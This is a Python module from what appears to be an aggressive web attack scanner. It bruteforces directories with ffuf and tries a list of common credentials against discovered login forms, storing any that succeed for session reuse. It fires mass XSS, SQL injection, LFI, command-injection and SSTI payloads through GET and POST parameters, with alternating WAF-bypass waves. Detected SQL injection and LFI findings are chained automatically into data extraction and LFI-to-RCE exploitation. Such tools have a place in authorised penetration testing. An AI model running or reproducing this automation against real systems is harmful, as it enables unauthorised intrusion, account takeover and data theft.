"""flood — verbatim split from poison.py (no logic changes)."""
import asyncio
import os
import re
import subprocess
import tempfile
import time
from collections import deque
from statistics import median
from urllib.parse import urlparse, urlencode
from typing import Dict, List, Optional, Set, Tuple
from core.external_tools import _find_tool
from core.ui import ph, i, w, s, p, G, C, B, N
from core.proxy_manager import get_global_proxy_manager
from modules.wordlists import WordlistProvider, PROVIDER
from runners.shared import inject_query_payload

from .state import COMMON_CREDS, FFUF_CALIBRATION_OVERHEAD, POST_FALLBACK_PARAMS, POST_MAX_PARAMS, POST_MAX_URLS, PoisonState, _LFI_MARKERS, _RCE_MARKERS, _SQL_ERRORS, _SSTI_EXPECTED, _XSS_TRIGGERS, _budget_ok, _classify_login_attempt, _cookie_names, _ffuf_timeout, _get_header, _get_proxy_flag, _loc_path
from .wave import _hold_for_backoff



# Phase: Bruteforce

async def _run_ffuf(base_url: str, wordlist: List[str], extension: str,
                    concurrency: int, timeout: int = 45, policy=None) -> List[str]:
    """Run ffuf, return discovered paths.

    ffuf never touches AsyncNetworkEngine, so the scan-policy gate has to live
    here: no dispatch once the request budget is spent, and -t is capped to
    what the budget can still afford.
    """
    ffuf_path = _find_tool("ffuf")
    if not ffuf_path:
        return []

    if policy is not None:
        remaining = policy.requests_remaining
        if remaining is not None:
            if remaining <= 0:
                return []
            concurrency = min(concurrency, remaining)
            # Debit the exact wordlist count (+ calibration allowance) and
            # only fuzz what the budget still covers — otherwise ffuf's
            # traffic stays invisible to max_requests. Charged only AFTER we
            # know the tool exists, so a missing ffuf costs no budget.
            affordable = min(len(wordlist),
                             max(0, remaining - FFUF_CALIBRATION_OVERHEAD))
            if affordable <= 0:
                return []
            wordlist = wordlist[:affordable]
            if policy.charge(len(wordlist) + FFUF_CALIBRATION_OVERHEAD,
                             reason=f"ffuf:{urlparse(base_url).netloc}") <= 0:
                return []

    wl_file = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt")
    for word in wordlist:
        wl_file.write(word + "\n")
    wl_file.close()

    url_parts = urlparse(base_url)
    base = f"{url_parts.scheme}://{url_parts.netloc}"
    ffuf_url = f"{base}/FUZZ{extension}"

    proxy = _get_proxy_flag()
    args = [
        ffuf_path, "-u", ffuf_url, "-w", wl_file.name,
        "-t", str(concurrency), "-ac", "-fc", "404,301,302", "-s",
    ]
    if proxy:
        args.extend(["-x", proxy])

    try:
        proc = await asyncio.create_subprocess_exec(
            *args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return []
        except asyncio.CancelledError:
            # Wave deadline hit: ffuf must not outlive max_duration.
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=2)
            except Exception:
                pass
            raise
        found = []
        for line in stdout.decode(errors="replace").strip().splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("/"):
                found.append(f"{base}{line}")
            elif line.startswith("http"):
                found.append(line)
            else:
                found.append(f"{base}/{line}")
        return found
    finally:
        os.unlink(wl_file.name)


async def phase_bruteforce(state: PoisonState):
    """Aggressive ffuf bruteforce — dirs, auth, extensions."""
    if not state.services:
        return
    if state.time_left < 5 or not _budget_ok(state):
        return
    if _hold_for_backoff(state, "ffuf bruteforce"):
        return

    base_url = state.services[0]["url"]
    concurrency = state.current_concurrency
    ffuf_timeout = _ffuf_timeout(state)
    wl = PROVIDER.get_dir_wordlist(wave=state.wave, limit=3000)

    # Dir bruteforce
    start = time.time()
    dirs = await _run_ffuf(base_url, wl, "", concurrency,
                           timeout=ffuf_timeout, policy=state.policy)
    state.track_latency(start)
    if dirs:
        state.add_urls(dirs)

    # Auth endpoints
    if state.time_left >= 5 and _budget_ok(state):
        auth_found = await _run_ffuf(
            base_url, PROVIDER.get_auth_wordlist(wave=state.wave, limit=500),
            "", concurrency, timeout=ffuf_timeout, policy=state.policy)
        state.add_urls(auth_found)

    # Extension bruteforce (shorter wordlist for speed)
    for ext in PROVIDER.get_extension_wordlist()[:8]:
        if state.time_left < 5 or not _budget_ok(state):
            break
        if _hold_for_backoff(state, "ffuf extension run"):
            break
        ext_found = await _run_ffuf(base_url, PROVIDER.get_dir_wordlist(limit=100),
                                    ext, concurrency // 2,
                                    timeout=_ffuf_timeout(state), policy=state.policy)
        state.add_urls([u for u in ext_found if u])

    # Auth bruteforce on discovered login pages
    login_urls = [u for u in state.scan_urls
                  if any(x in u.lower() for x in ["login", "admin", "auth", "signin"])]
    for url in login_urls[:3]:
        if state.time_left < 5 or not _budget_ok(state):
            break
        # Failed-login baseline: status + redirect target + cookies + body.
        # All four are needed for comparison — the old version kept only body
        # and cookie names, so any 3xx looked like a successful login.
        bad_data = urlencode({"username": "___nonexistent___", "password": "___wrong___", "submit": "1"})
        cred_headers = dict(state.auth_headers or {})
        cred_headers["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            fail_r = await state.async_engine.ahttp_send(
                url, method="POST", data=bad_data,
                headers=cred_headers, timeout=6,
                state_context=state.session_manager)
        except Exception:
            fail_r = {}
        if not isinstance(fail_r, dict):
            fail_r = {}
        fail_headers = fail_r.get("headers") or {}
        baseline = {
            "status": fail_r.get("status", 0) or 0,
            "loc_path": _loc_path(_get_header(fail_headers, "location")),
            "cookies": _cookie_names(_get_header(fail_headers, "set-cookie")),
            "body": (fail_r.get("body") or "").lower()[:2000],
        }

        found_creds = None
        for username, password in COMMON_CREDS:
            if state.time_left < 3:
                break
            form_data = urlencode({"username": username, "password": password, "submit": "1"})
            r = await state.async_engine.ahttp_send(
                url, method="POST", data=form_data,
                headers=cred_headers, timeout=5,
                state_context=state.session_manager)

            if not isinstance(r, dict):
                continue

            signal = _classify_login_attempt(
                r.get("status", 0), r.get("headers") or {},
                (r.get("body") or "").lower()[:2000], baseline,
            )
            if signal:
                found_creds = (username, password, signal[0], signal[1])
                break

        if found_creds:
            username, password, confidence, detail = found_creds
            state.add_finding({
                "type": "weak_credentials",
                "title": f"Weak Credentials: {username}:{password}",
                "url": url[:200],
                "detail": detail,
                "confidence": confidence,
            })
            # Store session cookies for rotation
            if confidence == "confirmed":
                state.session_cookies[url] = {"username": username, "password": password}


# Phase: Param Flood

async def phase_param_flood(state: PoisonState):
    """Massive Arjun param discovery."""
    from modules.extras.arjun import AsyncParamBruteforcer

    urls_to_scan = [u for u in state.get_high_value_targets(10)
                    if u not in state._param_scanned]
    for url in urls_to_scan:
        if state.time_left < 5 or not _budget_ok(state):
            break
        # Mark before the run so a wave that ends mid-scan does not restart it.
        state._param_scanned.add(url)
        bruteforcer = AsyncParamBruteforcer(
            url, state.async_engine,
            concurrency=state.current_concurrency // 2,
            chunk_size=20,
            session_manager=state.session_manager,
        )
        start = time.time()
        discovered = await bruteforcer.run()
        state.track_latency(start)
        if discovered:
            base_path = urlparse(url).path or "/"
            if base_path not in state.params:
                state.params[base_path] = []
            state.params[base_path].extend(discovered)


def _detect_from_response(resp: dict, ptype: str, payload: str,
                          baseline_body: str) -> dict | None:
    """Quick inline detection — mirrors VulnVerifier but batched."""
    body = (resp.get("body") or "") if isinstance(resp, dict) else ""
    status = resp.get("status", 0) if isinstance(resp, dict) else 0
    if not body or status <= 0:
        return None

    if ptype == "xss":
        for t in _XSS_TRIGGERS:
            if re.search(t, body, re.I) and not re.search(t, baseline_body, re.I):
                return {"type": "reflected_xss", "title": "Reflected XSS",
                        "detail": f"Trigger: {t}", "confidence": "suspected"}
    elif ptype == "sqli":
        for ep in _SQL_ERRORS:
            if re.search(ep, body, re.I) and not re.search(ep, baseline_body, re.I):
                return {"type": "sqli_error", "title": "SQL Injection (Error-based)",
                        "detail": f"Error: {ep}", "confidence": "suspected"}
    elif ptype == "lfi":
        for ind in _LFI_MARKERS:
            if re.search(ind, body, re.I) and not re.search(ind, baseline_body, re.I):
                return {"type": "lfi", "title": "Local File Inclusion",
                        "detail": f"Match: {ind}", "confidence": "suspected"}
    elif ptype == "rce":
        for ind in _RCE_MARKERS:
            if re.search(ind, body, re.I) and not re.search(ind, baseline_body, re.I):
                return {"type": "rce", "title": "RCE / Command Injection",
                        "detail": f"Match: {ind}", "confidence": "suspected"}
    elif ptype == "ssti":
        for expected in _SSTI_EXPECTED:
            if expected in body and expected not in baseline_body:
                return {"type": "ssti", "title": "SSTI",
                        "detail": f"Computed: {expected}",
                        "confidence": "suspected"}
    return None


async def _post_payload_pass(state, targets, payload_types, bypass,
                             generate) -> int:
    """Form-body pass — the GET-only flood cannot see reflected POST sinks.

    ONE canary POST per candidate URL; only URLs that echo the canary value
    (the endpoint parses AND reflects form fields) are worth fuzzing, capped
    at POST_MAX_URLS x POST_MAX_PARAMS x types x 3 payloads. Returns the
    number of findings added. Findings are not auto-chained: the chain
    helpers inject via query string, which a POST-only param does not have.
    """
    import uuid

    found = 0
    reflectors = 0
    for url in targets[:POST_MAX_URLS]:
        if state.time_left < 5 or not _budget_ok(state):
            break
        if _hold_for_backoff(state, "POST payload pass"):
            break

        path = urlparse(url).path or "/"
        params = state.params.get(path) or POST_FALLBACK_PARAMS
        canary = "vt" + uuid.uuid4().hex[:10]
        try:
            probe = await state.async_engine.ahttp_send(
                url, method="POST",
                data=urlencode({params[0]: canary}),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5, state_context=state.session_manager)
        except Exception:
            continue
        if not isinstance(probe, dict):
            continue
        status = probe.get("status", 0)
        probe_body = probe.get("body") or ""
        if status <= 0 or status in (404, 405, 501) or not probe_body:
            continue
        if canary not in probe_body:
            continue           # field not parsed/reflected → POST fuzz = noise
        reflectors += 1

        post_jobs = []
        for param in params[:POST_MAX_PARAMS]:
            for ptype in payload_types:
                for payload in generate(ptype, bypass=bypass)[:3]:
                    form = urlencode({param: payload})
                    post_jobs.append(
                        (url, param, ptype, payload, probe_body,
                         lambda _u=url, _f=form: state.async_engine.ahttp_send(
                             _u, method="POST", data=_f,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=4, bypass=bypass,
                             state_context=state.session_manager)))

        for idx in range(0, len(post_jobs), 50):
            if state.time_left < 3 or not _budget_ok(state):
                break
            batch = post_jobs[idx:idx + 50]
            results = await asyncio.gather(*[j[5]() for j in batch],
                                            return_exceptions=True)
            for k, res in enumerate(results):
                if isinstance(res, Exception) or not isinstance(res, dict):
                    continue
                job_url, job_param, job_ptype, job_payload, baseline, _ = batch[k]
                finding = _detect_from_response(res, job_ptype, job_payload,
                                                baseline)
                if finding:
                    found += 1
                    finding["url"] = job_url[:200]
                    finding["detail"] = f"POST {job_param} | {finding['detail']}"
                    finding["waf"] = "/".join(res.get("waf") or [])
                    state.add_finding(finding)

    if reflectors:
        i(f"POST body pass: {reflectors} reflector(s), {found} hit(s)")
    return found


async def phase_payload_flood(state: PoisonState):
    """Mass injection + inline vulnerability detection with auto-chaining."""
    from modules.scanners.scanner import SmartPayloadGenerator

    if not _budget_ok(state):
        return

    payload_types = ["xss", "sqli", "lfi", "rce", "ssti"]
    bypass = state.wave % 2 == 1
    jobs = []

    # Use high-value targets first
    targets = state.get_high_value_targets(15)

    for url in targets:
        parsed = urlparse(url)
        base_path = parsed.path or "/"
        params_to_test = state.params.get(base_path, [])
        if not params_to_test:
            params_to_test = ["q", "id", "url", "page", "file",
                              "redirect", "cmd", "search", "debug", "action"]

        for param in params_to_test[:5]:
            for ptype in payload_types:
                payloads = SmartPayloadGenerator.generate(ptype, bypass=bypass)
                for payload in payloads[:3]:
                    target = inject_query_payload(url, param, payload)
                    jobs.append((url, param, ptype, payload,
                                 lambda _t=target: state.async_engine.ahttp_send(
                                     _t, timeout=4, bypass=bypass,
                                     state_context=state.session_manager)))

    if not jobs:
        return

    total = len(jobs)
    found = 0
    i(f"[Wave {state.wave}] Payload Flood: {B}{total}{N} ({'bypass' if bypass else 'raw'}) + detection")

    # Get baseline per unique URL — PARALLEL with bounded concurrency.
    # A sequential loop here (the original shape) scales to unique_urls x 6s
    # timeout per wave; gather + Semaphore(20) keeps it to a few rounds.
    url_baselines = {}
    unique_urls = list(dict.fromkeys(j[0] for j in jobs))[:100]

    async def _fetch_baseline(u, sem):
        async with sem:
            try:
                start = time.time()
                br = await state.async_engine.ahttp_send(
                    u, timeout=6, state_context=state.session_manager)
                state.track_latency(start)
                return u, (br.get("body") or "") if isinstance(br, dict) else ""
            except Exception:
                return u, ""

    if unique_urls and state.time_left > 10:
        _bsem = asyncio.Semaphore(20)
        for res in await asyncio.gather(
                *[_fetch_baseline(u, _bsem) for u in unique_urls],
                return_exceptions=True):
            if isinstance(res, tuple):
                url_baselines[res[0]] = res[1]
        # Cache only non-empty bodies: a transient fetch failure ("") must
        # not wipe a good baseline captured in an earlier wave.
        state._url_baselines.update(
            {k: v for k, v in url_baselines.items() if v})
    else:
        # Wave almost over — reuse baselines from earlier waves instead of
        # emptying them (an empty baseline makes every guarded marker fire).
        url_baselines = {u: state._url_baselines.get(u, "")
                         for u in unique_urls}

    # Collect auto-chain targets (don't block the batch loop)
    auto_chain_targets = {"sqli": [], "lfi": []}

    batch_size = 200
    for idx in range(0, total, batch_size):
        if state.time_left < 5:
            break
        batch = jobs[idx:idx + batch_size]

        # Fire batch
        tasks = [j[4]() for j in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Detect from results
        for res_idx, result in enumerate(results):
            if isinstance(result, Exception) or result is None:
                continue
            url, param, ptype, payload, _ = batch[res_idx]
            baseline = url_baselines.get(url, "")
            if not baseline:
                # No baseline for this URL (new URL, fetch failed, and no
                # cached copy) — guarded markers would fire on ordinary
                # pages. Skip rather than fabricate a finding.
                continue
            finding = _detect_from_response(result, ptype, payload, baseline)
            if finding:
                finding["url"] = url[:200]
                finding["detail"] = f"Param: {param} | {finding['detail']}"
                finding["waf"] = "/".join(result.get("waf", [])) if isinstance(result, dict) else ""
                state.add_finding(finding)
                found += 1

                # Queue auto-chain targets (don't block batch)
                if ptype == "sqli":
                    auto_chain_targets["sqli"].append((url, param))
                elif ptype == "lfi":
                    auto_chain_targets["lfi"].append((url, param))

    # POST body pass — GET jobs above can only hit query-string sinks
    if targets and state.time_left > 5:
        found += await _post_payload_pass(state, targets, payload_types,
                                          bypass,
                                          SmartPayloadGenerator.generate)

    # Run auto-chains AFTER all batches complete (non-blocking)
    if auto_chain_targets["sqli"] and state.time_left > 8:
        for url, param in auto_chain_targets["sqli"][:3]:
            try:
                from modules.web.server_side.sqli_extractor import SQLiExtractor
                extractor = SQLiExtractor(state.async_engine, state.session_manager)
                extracted = await extractor.extract(url, param)
                if extracted:
                    state.extend_findings(extracted)
            except Exception as e:
                w(f"SQLi auto-chain error on {url[:60]}: {str(e)[:60]}")

    if auto_chain_targets["lfi"] and state.time_left > 12:
        for url, param in auto_chain_targets["lfi"][:3]:
            try:
                from modules.web.server_side.lfi_rce_chain import LFItoRCE
                chain = LFItoRCE(state.async_engine, state.session_manager)
                rce_findings = await chain.exploit(url, param)
                if rce_findings:
                    state.extend_findings(rce_findings)
            except Exception as e:
                w(f"LFI→RCE chain error on {url[:60]}: {str(e)[:60]}")

    if found:
        p(f"{G}{found}{N} vulns detected in payload flood wave {state.wave}")
